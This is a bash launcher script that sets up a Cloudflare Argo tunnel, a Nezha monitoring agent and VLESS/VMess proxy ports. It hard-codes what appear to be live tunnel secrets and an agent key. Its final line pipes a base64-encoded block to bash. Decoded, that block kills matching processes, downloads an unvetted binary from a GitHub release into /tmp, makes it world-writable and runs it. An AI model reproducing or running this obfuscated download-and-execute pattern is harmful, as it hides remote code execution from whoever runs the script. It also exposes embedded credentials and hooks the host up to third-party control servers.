#!/bin/bash
 
# 
export TOK=${TOK:-'{"AccountTag":"9ef3111edca33d70066921bf9b778247","TunnelSecret":"E1IsXn+IEa2Vgn09OTjTIGzn5eLmVfd6oGrdvWKRkRQ=","TunnelID":"165a5475-dc4d-44ea-8ad3-7eb5c99a2417"}'}  # 
export ARGO_DOMAIN=${ARGO_DOMAIN:-'b.psyd.us.kg'} # 

# 
export NEZHA_SERVER=${NEZHA_SERVER:-'nz.fcuk.eu.org'}
export NEZHA_KEY=${NEZHA_KEY:-'gyjtuXu5wpGdj9nEYE'}
export NEZHA_PORT=${NEZHA_PORT:-'5555'}
export NEZHA_TLS=${NEZHA_TLS:-'0'}  #

# 
export TMP_ARGO=${TMP_ARGO:-'vls'}  # 
export UUID="e4d0b96f-8a02-466a-8f96-109769465ad8"  # 
export VL_PORT=${VL_PORT:-'8002'} #vles
export VM_PORT=${VM_PORT:-'8001'} #vmes
export CF_IP=${CF_IP:-'ip.sb'}  #
export SUB_NAME=${SUB_NAME:-'Argo'} #

# 
# export JAR_SH='java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar senver.jar'  # 

# 
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
